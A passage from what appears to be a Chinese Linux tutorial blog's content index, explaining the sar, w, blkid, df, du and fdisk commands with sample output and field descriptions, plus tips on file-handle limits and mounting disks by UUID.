3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost ~]# sar -p 1 3 Linux 2.6.32-431.el6.x86_64 (localhost) 2017年07月12日 _x86_64_ (4 CPU)13时31分16秒 CPU %user %nice %system %iowait %steal %idle13时31分17秒 all 0.00 0.00 0.25 0.00 0.00 99.7513时31分18秒 all 0.25 0.00 0.50 0.00 0.00 99.2613时31分19秒 all 0.00 0.00 0.25 0.00 0.00 99.75平均时间: all 0.08 0.00 0.33 0.00 0.00 99.58 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 #CPU 所有CPU的统计 #%user 用户态的CPU使用统计 #%nice 更改过优先级的进程的CPU使用统计 #%iowait CPU等待IO数据的百分比 #%steal 虚拟机的vCPU占用的物理CPU的百分比 #%idle 空闲的CPU百分比 实例3：查看平均负载&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -q &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost ~]# sar -q 2 2Linux 2.6.32-431.el6.x86_64 (localhost) 2017年07月12日 _x86_64_ (4 CPU)13时35分07秒 runq-sz plist-sz ldavg-1 ldavg-5 ldavg-1513时35分09秒 0 167 0.00 0.00 0.0013时35分11秒 0 167 0.00 0.00 0.00平均时间: 0 167 0.00 0.00 0.00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 #runq-sz 运行队列的长度（等待运行的进程数，每核的CP不能超过3个） #plist-sz 进程列表中的进程（processes）和线程数（threads）的数量 #ldavg-1 最后1分钟的CPU平均负载，即将多核CPU过去一分钟的负载相加再除以核心数得出的平均值，5分钟和15分钟以此类推 #ldavg-5 最后5分钟的CPU平均负载 #ldavg-15 最后15分钟的CPU平均负载 实例4：查看内存使用情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -r &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost ~]# sar -r 1 2Linux 2.6.32-431.el6.x86_64 (localhost) 2017年07月12日 _x86_64_ (4 CPU)13时38分01秒 kbmemfree kbmemused %memused kbbuffers kbcached kbcommit %commit13时38分02秒 1507864 398688 20.91 19632 176552 237716 3.9013时38分03秒 1507864 398688 20.91 19632 176552 237716 3.90平均时间: 1507864 398688 20.91 19632 176552 237716 3.90 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 #kbmemfree 空闲的物理内存大小 #kbmemused 使用中的物理内存大小 #%memused 物理内存使用率 #kbbuffers 内核中作为缓冲区使用的物理内存大小，kbbuffers和kbcached:这两个值就是free命令中的buffer和cache. #kbcached 缓存的文件大小 #kbcommit 保证当前系统正常运行所需要的最小内存，即为了确保内存不溢出而需要的最少内存（物理内存+Swap分区） #commit 这个值是kbcommit与内存总量（物理内存+swap分区）的一个百分比的值 实例5：查看系统swap分区的统计信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -W &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost ~]# sar -W 1 2Linux 2.6.32-431.el6.x86_64 (localhost) 2017年07月12日 _x86_64_ (4 CPU)13时40分51秒 pswpin/s pswpout/s13时40分52秒 0.00 0.0013时40分53秒 0.00 0.00平均时间: 0.00 0.00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 #pswpin/s 每秒从交换分区到系统的交换页面（swap page）数量 #pswpott/s 每秒从系统交换到swap的交换页面（swap page）的数量 实例6：查看I/O和传递速率的统计信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -b &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost ~]# sar -b 1 3Linux 2.6.32-431.el6.x86_64 (localhost) 2017年07月12日 _x86_64_ (4 CPU)13时43分10秒 tps rtps wtps bread/s bwrtn/s13时43分11秒 0.00 0.00 0.00 0.00 0.0013时43分12秒 0.00 0.00 0.00 0.00 0.0013时43分13秒 0.00 0.00 0.00 0.00 0.00平均时间: 0.00 0.00 0.00 0.00 0.00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 #tps 磁盘每秒钟的IO总数，等于iostat中的tps #rtps 每秒钟从磁盘读取的IO总数 #wtps 每秒钟从写入到磁盘的IO总数 #bread/s 每秒钟从磁盘读取的块总数 #bwrtn/s 每秒钟此写入到磁盘的块总数 实例7：磁盘使用详情统计&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -d &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718[root@localhost ~]# sar -d 1 3Linux 2.6.32-431.el6.x86_64 (localhost) 2017年07月12日 _x86_64_ (4 CPU)13时45分57秒 DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util13时45分58秒 dev11-0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.0013时45分58秒 dev8-0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.0013时45分58秒 DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util13时45分59秒 dev11-0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.0013时45分59秒 dev8-0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.0013时45分59秒 DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util13时46分00秒 dev11-0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.0013时46分00秒 dev8-0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00平均时间: DEV tps rd_sec/s wr_sec/s avgrq-sz avgqu-sz await svctm %util平均时间: dev11-0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00平均时间: dev8-0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 #DEV 磁盘设备的名称，如果不加-p，会显示dev253-0类似的设备名称，因此加上-p显示的名称更直接 #tps：每秒I/O的传输总数 #rd_sec/s 每秒读取的扇区的总数 #wr_sec/s 每秒写入的扇区的 总数 #avgrq-sz 平均每次次磁盘I/O操作的数据大小（扇区） #avgqu-sz 磁盘请求队列的平均长度 #await 从请求磁盘操作到系统完成处理，每次请求的平均消耗时间，包括请求队列等待时间，单位是毫秒（1秒等于1000毫秒），等于寻道时间+队列时间+服务时间 #svctm I/O的服务处理时间，即不包括请求队列中的时间 #%util I/O请求占用的CPU百分比，值越高，说明I/O越慢 实例8：进程、inode、文件和锁表状态&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -v &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost ~]# sar -v 1 3Linux 2.6.32-431.el6.x86_64 (localhost) 2017年07月12日 _x86_64_ (4 CPU)13时49分02秒 dentunusd file-nr inode-nr pty-nr13时49分03秒 16295 672 12498 213时49分04秒 16295 672 12498 213时49分05秒 16295 672 12498 2平均时间: 16295 672 12498 2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 #dentunusd 在缓冲目录条目中没有使用的条目数量 #file-nr 被系统使用的文件句柄数量 #inode-nr 已经使用的索引数量 #pty-nr 使用的pty数量 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里面的索引和文件句柄值不是ulimit -a查看到的值，而是sysctl.conf里面定义的和内核相关的值， max-file表示系统级别的能够打开的文件句柄的数量， 而ulimit -n控制进程级别能够打开的文件句柄的数量，可以使用sysctl -a | grep inode和sysctl -a | grep file查看，具体含义如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;file-max中指定了系统范围内所有进程可打开的文件句柄的数量限制(系统级别， kernel-level)。 （The value in file-max denotes the maximum number of file handles that the Linux kernel will allocate）。当收到”Too many open files in system”这样的错误消息时， 就应该曾加这个值了。 123# cat /proc/sys/fs/file-max4096# echo 100000 &gt; /proc/sys/fs/file-max &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者 12# echo ""fs.file-max=65535" &gt;&gt; /etc/sysctl.conf# sysctl -p &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;file-nr 可以查看系统中当前打开的文件句柄的数量。 他里面包括3个数字： 第一个表示已经分配了的文件描述符数量， 第二个表示空闲的文件句柄数量， 第三个表示能够打开文件句柄的最大值（跟file-max一致）。 内核会动态的分配文件句柄， 但是不会再次释放他们（这个可能不适应最新的内核了， 在我的file-nr中看到第二列一直为0， 第一列有增有减） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;man bash， 找到说明ulimit的那一节：提供对shell及其启动的进程的可用资源（包括文件句柄， 进程数量， core文件大小等）的控制。 这是进程级别的， 也就是说系统中某个session及其启动的每个进程能打开多少个文件描述符， 能fork出多少个子进程等… 当达到上限时， 会报错”Too many open files”或者遇上Socket/File: Can’t open so many files等 12345[root@localhost ~]# sysctl fs.file-nrfs.file-nr = 672 0 187015You have new mail in /var/spool/mail/root[root@localhost ~]# sysctl -a | grep fs.file-nrfs.file-nr = 672 0 187015 实例9：统计网络信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -n &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sar -n选项使用6个不同的开关：DEV，EDEV，NFS，NFSD，SOCK，IP，EIP，ICMP，EICMP，TCP，ETCP，UDP，SOCK6，IP6，EIP6，ICMP6，EICMP6和UDP6 ，DEV显示网络接口信息，EDEV显示关于网络错误的统计数据，NFS统计活动的NFS客户端的信息，NFSD统计NFS服务器的信息，SOCK显示套接字信息，ALL显示所有5个开关。它们可以单独或者一起使用。 每间隔1秒统计一次，总计统计1次&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -n DEV 1 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost ~]# sar -n DEV 1 1Linux 2.6.32-431.el6.x86_64 (localhost) 2017年07月12日 _x86_64_ (4 CPU)13时56分20秒 IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s13时56分21秒 lo 0.00 0.00 0.00 0.00 0.00 0.00 0.0013时56分21秒 eth0 1.01 1.01 0.06 0.17 0.00 0.00 0.00平均时间: IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s平均时间: lo 0.00 0.00 0.00 0.00 0.00 0.00 0.00平均时间: eth0 1.01 1.01 0.06 0.17 0.00 0.00 0.00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 #IFACE 本地网卡接口的名称 #rxpck/s 每秒钟接受的数据包 #txpck/s 每秒钟发送的数据库 #rxKB/S 每秒钟接受的数据包大小，单位为KB #txKB/S 每秒钟发送的数据包大小，单位为KB #rxcmp/s 每秒钟接受的压缩数据包 #txcmp/s 每秒钟发送的压缩包 #rxmcst/s 每秒钟接收的多播数据包 统计网络设备通信失败信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -n EDEV 1 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost ~]# sar -n EDEV 1 1Linux 2.6.32-431.el6.x86_64 (localhost) 2017年07月12日 _x86_64_ (4 CPU)13时59分23秒 IFACE rxerr/s txerr/s coll/s rxdrop/s txdrop/s txcarr/s rxfram/s rxfifo/s txfifo/s13时59分24秒 lo 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.0013时59分24秒 eth0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00平均时间: IFACE rxerr/s txerr/s coll/s rxdrop/s txdrop/s txcarr/s rxfram/s rxfifo/s txfifo/s平均时间: lo 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00平均时间: eth0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 #IFACE 网卡名称 #rxerr/s 每秒钟接收到的损坏的数据包 #txerr/s 每秒钟发送的数据包错误数 #coll/s 当发送数据包时候，每秒钟发生的冲撞（collisions）数，这个是在半双工模式下才有 #rxdrop/s 当由于缓冲区满的时候，网卡设备接收端每秒钟丢掉的网络包的数目 #txdrop/s 当由于缓冲区满的时候，网络设备发送端每秒钟丢掉的网络包的数目 #txcarr/s 当发送数据包的时候，每秒钟载波错误发生的次数 #rxfram 在接收数据包的时候，每秒钟发生的帧对其错误的次数 #rxfifo 在接收数据包的时候，每秒钟缓冲区溢出的错误发生的次数 #txfifo 在发生数据包 的时候，每秒钟缓冲区溢出的错误发生的次数 统计socket连接信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -n SOCK 1 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost ~]# sar -n SOCK 1 1Linux 2.6.32-431.el6.x86_64 (localhost) 2017年07月12日 _x86_64_ (4 CPU)14时02分35秒 totsck tcpsck udpsck rawsck ip-frag tcp-tw14时02分36秒 389 5 5 0 0 0平均时间: 389 5 5 0 0 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 #totsck 当前被使用的socket总数 #tcpsck 当前正在被使用的TCP的socket总数 #udpsck 当前正在被使用的UDP的socket总数 #rawsck 当前正在被使用于RAW的skcket总数 #if-frag 当前的IP分片的数目 #tcp-tw TCP套接字中处于TIME-WAIT状态的连接数量 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果使用FULL关键字，相当于上述DEV、EDEV和SOCK三者的综合 TCP连接的统计&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -n TCP 1 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost ~]# sar -n TCP 1 3Linux 2.6.32-431.el6.x86_64 (localhost) 2017年07月12日 _x86_64_ (4 CPU)14时05分30秒 active/s passive/s iseg/s oseg/s14时05分31秒 0.00 0.00 0.00 0.0014时05分32秒 0.00 0.00 1.04 1.0414时05分33秒 0.00 0.00 1.00 1.00平均时间: 0.00 0.00 0.68 0.68 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 #active/s 新的主动连接 #passive/s 新的被动连接 #iseg/s 接受的段 #oseg/s 输出的段 sar -n 使用总结 -n DEV ： 网络接口统计信息。 -n EDEV ： 网络接口错误。 -n IP ： IP数据报统计信息。 -n EIP ： IP错误统计信息。 -n TCP ： TCP统计信息。 -n ETCP ： TCP错误统计信息。 -n SOCK ： 套接字使用。 常用命令汇总&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因版本和平台不同，有部分命令可能没有或显示结果不一致： sar -b 5 5 IO传送速率 sar -B 5 5 页交换速率 sar -c 5 5 进程创建的速率 sar -d 5 5 块设备的活跃信息 sar -n DEV 5 5 网路设备的状态信息 sar -n SOCK 5 5 SOCK的使用情况 sar -n ALL 5 5 所有的网络状态信息 sar -P ALL 5 5 每颗CPU的使用状态信息和IOWAIT统计状态 sar -q 5 5 队列的长度（等待运行的进程数）和负载的状态 sar -r 5 5 内存和swap空间使用情况 sar -R 5 5 内存的统计信息（内存页的分配和释放、系统每秒作为BUFFER使用内存页、每秒被cache到的内存页） `sar -u 5 5 CPU的使用情况和IOWAIT信息（同默认监控） sar -v 5 5 inode, file and other kernel tablesd的状态信息 sar -w 5 5 每秒上下文交换的数目 sar -W 5 5 SWAP交换的统计信息(监控状态同iostat 的si so) sar -x 2906 5 5 显示指定进程(2906)的统计信息，信息包括：进程造成的错误、用户级和系统级用户CPU的占用情况、运行在哪颗CPU上 sar -y 5 5 TTY设备的活动状态 将输出到文件(-o)和读取记录信息(-f)]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- w]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F77.%20Linux%20%E5%91%BD%E4%BB%A4-%20w%2F</url>
    <content type="text"><![CDATA[Linux 命令- w&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;w命令用于显示已经登陆系统的用户列表，并显示用户正在执行的指令。执行这个命令可得知目前登入系统的用户有那些人，以及他们正在执行的程序。单独执行w命令会显示所有的用户，您也可指定用户名称，仅显示某位用户的相关信息。 命令格式1w [参数] [用户名称] 命令选项 -f 开启或关闭显示用户从何处登入系统。 -h 不显示各栏位的标题信息列。 -l 使用详细格式列表，此为预设值。 -s 使用简洁格式列表，不显示用户登入时间，终端机阶段作业和程序所耗费的CPU时间。 -u 忽略执行程序的名称，以及该程序耗费CPU时间的信息。 -V 显示版本信息。 命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;显示目前登入系统的用户信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行这项指令可得知目前登入系统的用户有那些人，以及他们正在执行的程序。单独执行w指令会显示所有的用户，您也可指定用户名称，仅显示某位用户的相关信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;w命令也用于显示登录到系统的用户情况，但是与who不同的是，w命令功能更加强大，它不但可以显示有谁登录到系统，还可以显示出这些用户当前正在进行的工作，感觉比较实用，具体用法如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;w命令的显示项目按以下顺序排列：当前时间，系统启动到现在的时间，登录用户的数目，系统在最 近1秒、5秒和15秒的平均负载。然后是每个用户的各项数据，项目显示顺序如下：登录帐号、终端名称、远 程主机名、登录时间、空闲时间、JCPU、PCPU、当前正在运行进程的命令行。 使用实例1234[root@localhost ~]# w 20:39:37 up 136 days, 3:58, 1 user, load average: 0.00, 0.00, 0.00 USER TTY FROM login@ IDLE JCPU PCPU WHAT root pts/0 222.94.97.122 20:39 1.00s 0.00s 0.00s w &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux管理员最常用的命令就是这个 w 了，该命令显示的信息还是蛮丰富的。第一行从左面开始显示的信息依次为：时间，系统运行时间，登录用户数，平均负载。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第二行开始以及下面所有的行，告诉我们的信息是，当前登录的都有哪些用户，以及他们是从哪里登录的等等。 USER：登录用户名 TTY：登录后系统分配的终端号 FROM：远程主机名，即从哪里登录的 LOGIN@：何时登录 IDLE：用户空间时间，这是个计时器，一旦用户执行任何操作，该计时器便会被重置 JCPU：和该终端连接的所有进程占用时间。包括当前正在运行的后台作业占用时间 PCPU：当前进程所占用的时间 WHAT：当前正在运行进程的命令行 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在这些信息中，我们最应该关注的应该是第一行中的 ‘load average:’ 后面的三个数值。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一个数值表示1分钟内系统的平均负载值；第二个数值表示5分钟内系统的平均负载值；第三个数值表示15分钟系统的平均负载值。这个值的意义是，单位时间段内CPU活动进程数。当然这个值越大就说明服务器压力越大。一般情况下这个值只要不超过服务器的cpu数量就没有关系，如果服务器cpu数量为8，那么这个值若小于8，就说明当前服务器没有压力，否则就要关注一下了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;怎么查看服务器有几个cpu &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1grep -c 'processor' /proc/cpuinfo &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;‘/proc/cpuinfo’ 这个文件记录了cpu的详细信息。目前市面上的服务器通常都是2颗4核cpu，在linux看来，它就是8个cpu。查看这个文件时则会显示8段类似的信息，而最后一段信息中processor : 后面跟的是 ‘7’ 所以查看当前系统有几个cpu，我们可以使用这个命令： grep -c ‘processor’ /proc/cpuinfo 而如何看几颗物理cpu呢，需要查看关键字 “physical id” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外，uptime命令同样可以查看系统负载。实际上uptime得出的结果和w的第一行是一致的。 备注1) 区别于who命令，w命令不仅可以看到登录服务器的用户信息，而且可以看到这些用户做了什么2) who am i命令，显示出自己在系统中的用户名，登录终端，登录时间3) whoami命令，显示自己在系统中的用户名4) logname命令，可以显示自己初次登录到系统中的用户名，主要识别sudo前后情形5) last命令，查看最近1个月用户登录服务器的情况6) tty命令，来查看所连接的设备或终端]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- blkid]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F76.%20Linux%20%E5%91%BD%E4%BB%A4-%20blkid%2F</url>
    <content type="text"><![CDATA[Linux 命令- blkid&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在日常的运维工作中遇到过这样的情况，一台服务器上新装了两块磁盘，磁盘a（在服务器上显示为sdc）和磁盘b（在服务器上显示为sdd），有一次把这两块磁盘都拔掉了，然后再重新插上，重启机器，结果磁盘编号调换了，a变成了sdd，b变成了sdc（这是因为把磁盘插错了插槽），问题来了。通过上边的学习，你挂载磁盘是通过/dev/hdb1 这样的分区名字来挂载的，如果先前加入到了/etc/fstab 中，结果系统启动后则会挂载错分区。那么怎么样避免这样的情况发生？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这就用到了UUID，可以通过 blkid 命令获取各分区的UUID: 12345/dev/sda1: UUID="a593ff68-2db7-4371-8d8c-d936898e9ac9" TYPE="ext4"/dev/sda2: UUID="ff042a91-b68f-4d64-9759-050c51dc9e8b" TYPE="swap"/dev/sda3: UUID="95297b81-538d-4d96-870a-de90255b74f5" TYPE="ext4"/dev/sdb5: LABEL="TEST" UUID="c61117ca-9176-4d0b-be4d-1b0f434359a7" TYPE="ext4"/dev/sdb6: UUID="c271cb5a-cb46-42f4-9eb4-d2b1a5028e18" SEC_TYPE="ext2" TYPE="ext3" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样可以获得全部磁盘分区的UUID，如果格式化的时候指定了 LABEL 则该命令也会显示LABEL值，甚至连文件系统类型也会显示。当然这个命令后面也可以指定哪个分区： 12[root@localhost ~]# blkid /dev/sdb5/dev/sdb5: LABEL="TEST" UUID="c61117ca-9176-4d0b-be4d-1b0f434359a7" TYPE="ext4" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;获得UUID后，如何使用它呢？ 12345678[root@localhost ~]# umount /newdir[root@localhost ~]# mount UUID="c61117ca-9176-4d0b-be4d-1b0f434359a7" /newdir[root@localhost ~]# df -h文件系统 容量 已用 可用 已用%% 挂载点/dev/sda3 14G 1.5G 12G 11% /tmpfs 160M 0 160M 0% /dev/shm/dev/sda1 97M 27M 66M 29% /boot/dev/sdb5 989M 18M 921M 2% /newdir &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以把下面这行写到 /etc/fstab 中 1UUID=c61117ca-9176-4d0b-be4d-1b0f434359a7 /newdir ext4 defaults 0 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果想让某个分区开机后就自动挂载，有两个办法可以实现： 在 /etc/fstab 中添加一行，如上例中那行； 把挂载命令写到 /etc/rc.d/rc.local 文件中去，阿铭会经常把想要开机启动的命令加到这个文件中。系统启动完后会执行这个文件中的命令，所以只要你想开机后运行什么命令统统写入到这个文件下面吧，直接放到最后面即可，阿铭把挂载的命令放到该文件的最后一行了： 123456789[root@localhost ~]# cat /etc/rc.d/rc.local#!/bin/sh## This script will be executed *after* all the other init scripts.# You can put your own initialization stuff in here if you don't# want to do the full Sys V style init stuff.touch /var/lock/subsys/localmount UUID="c61117ca-9176-4d0b-be4d-1b0f434359a7" /newdir &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上两种方法，任选其一，介绍第二种方法其实也是一个小知识，如何让一些操作行为随系统启动而自动执行。另外一个小建议，那就是挂载磁盘分区的时候，尽量使用UUID或者LABEL这两种方法。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 磁盘管理]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F75.%20Linux%20%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[Linux 磁盘管理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux磁盘管理好坏管理直接关系到整个系统的性能问题。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux磁盘管理常用三个命令为df、du和fdisk。 df：列出文件系统的整体磁盘使用量 du：检查磁盘空间使用量 fdisk：用于磁盘分区 df&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;df命令参数功能：检查文件系统的磁盘空间占用情况。可以利用该命令来获取硬盘被占用了多少空间，目前还剩下多少空间等信息。 语法：1df [-ahikHTm] [目录或文件名] 选项与参数： -a ：列出所有的文件系统，包括系统特有的 /proc 等文件系统； -k ：以 KBytes 的容量显示各文件系统； -m ：以 MBytes 的容量显示各文件系统； -h ：以人们较易阅读的 GBytes, MBytes, KBytes 等格式自行显示； -H ：以 M=1000K 取代 M=1024K 的进位方式； -T ：显示文件系统类型, 连同该 partition 的 filesystem 名称 (例如 ext3) 也列出； -i ：不用硬盘容量，而以 inode 的数量来显示 使用实例实例1：将系统内所有的文件系统列出来！123456[root@www ~]# dfFilesystem 1K-blocks Used Available Use% Mounted on/dev/hdc2 9920624 3823112 5585444 41% //dev/hdc3 4956316 141376 4559108 4% /home/dev/hdc1 101086 11126 84741 12% /boottmpfs 371332 0 371332 0% /dev/shm &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 Linux 底下如果 df 没有加任何选项，那么默认会将系统内所有的 (不含特殊内存内的文件系统与 swap) 都以 1 Kbytes 的容量来列出来！ 实例2:将容量结果以易读的容量格式显示出来123456[root@www ~]# df -hFilesystem Size Used Avail Use% Mounted on/dev/hdc2 9.5G 3.7G 5.4G 41% //dev/hdc3 4.8G 139M 4.4G 4% /home/dev/hdc1 99M 11M 83M 12% /boottmpfs 363M 0 363M 0% /dev/shm 实例3:将系统内的所有特殊文件格式及名称都列出来1234567891011[root@www ~]# df -aTFilesystem Type 1K-blocks Used Available Use% Mounted on/dev/hdc2 ext3 9920624 3823112 5585444 41% /proc proc 0 0 0 - /procsysfs sysfs 0 0 0 - /sysdevpts devpts 0 0 0 - /dev/pts/dev/hdc3 ext3 4956316 141376 4559108 4% /home/dev/hdc1 ext3 101086 11126 84741 12% /boottmpfs tmpfs 371332 0 371332 0% /dev/shmnone binfmt_misc 0 0 0 - /proc/sys/fs/binfmt_miscsunrpc rpc_pipefs 0 0 0 - /var/lib/nfs/rpc_pipefs 实例4:将 /etc 底下的可用的磁盘容量以易读的容量格式显示123[root@www ~]# df -h /etcFilesystem Size Used Avail Use% Mounted on/dev/hdc2 9.5G 3.7G 5.4G 41% / du&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux du命令也是查看使用空间的，但是与df命令不同的是Linux du命令是对文件和目录磁盘使用的空间的查看，还是和df命令有一些区别的，这里介绍Linux du命令。 语法：1du [-ahskm] 文件或目录名称 选项与参数： -a ：列出所有的文件与目录容量，因为默认仅统计目录底下的文件量而已。 -h ：以人们较易读的容量格式 (G/M) 显示； -s ：列出总量而已，而不列出每个各别的目录占用容量； -S ：不包括子目录下的总计，与 -s 有点差别。 -k ：以 KBytes 列出容量显示； -m ：以 MBytes 列出容量显示； 实例1:列出目前目录下的所有文件容量123456[root@www ~]# du8 ./test4 &lt;==每个目录都会列出来8 ./test2....中间省略....12 ./.gconfd &lt;==包括隐藏文件的目录220 . &lt;==这个目录(.)所占用的总量 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;直接输入 du 没有加任何选项时，则 du 会分析当前所在目录的文件与目录所占用的硬盘空间。 实例2:将文件的容量也列出来12345678[root@www ~]# du -a12 ./install.log.syslog &lt;==有文件的列表了8 ./.bash_logout8 ./test48 ./test2....中间省略....12 ./.gconfd220 . 实例:3检查根目录底下每个目录所占用的容量123456789[root@www ~]# du -sm /*7 /bin6 /boot.....中间省略....0 /proc.....中间省略....1 /tmp3859 /usr &lt;==系统初期最大就是他了啦！77 /var &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通配符 * 来代表每个目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;与 df 不一样的是，du 这个命令其实会直接到文件系统内去搜寻所有的文件数据。 fdisk&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;fdisk 是 Linux 的磁盘分区表操作工具。 语法：1fdisk [-l] 装置名称 选项与参数： -l ：输出后面接的装置所有的分区内容。若仅有 fdisk -l 时， 则系统将会把整个系统内能够搜寻到的装置的分区均列出来。 实例1:列出所有分区信息12345678910111213141516171819202122[root@AY120919111755c246621 tmp]# fdisk -lDisk /dev/xvda: 21.5 GB, 21474836480 bytes255 heads, 63 sectors/track, 2610 cylindersUnits = cylinders of 16065 * 512 = 8225280 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x00000000 Device Boot Start End Blocks Id System/dev/xvda1 * 1 2550 20480000 83 Linux/dev/xvda2 2550 2611 490496 82 Linux swap / SolarisDisk /dev/xvdb: 21.5 GB, 21474836480 bytes255 heads, 63 sectors/track, 2610 cylindersUnits = cylinders of 16065 * 512 = 8225280 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x56f40944 Device Boot Start End Blocks Id System/dev/xvdb2 1 2610 20964793+ 83 Linux 实例2:找出你系统中的根目录所在磁盘，并查阅该硬盘内的相关信息12345678910111213[root@www ~]# df / &lt;==注意：重点在找出磁盘文件名而已Filesystem 1K-blocks Used Available Use% Mounted on/dev/hdc2 9920624 3823168 5585388 41% /[root@www ~]# fdisk /dev/hdc 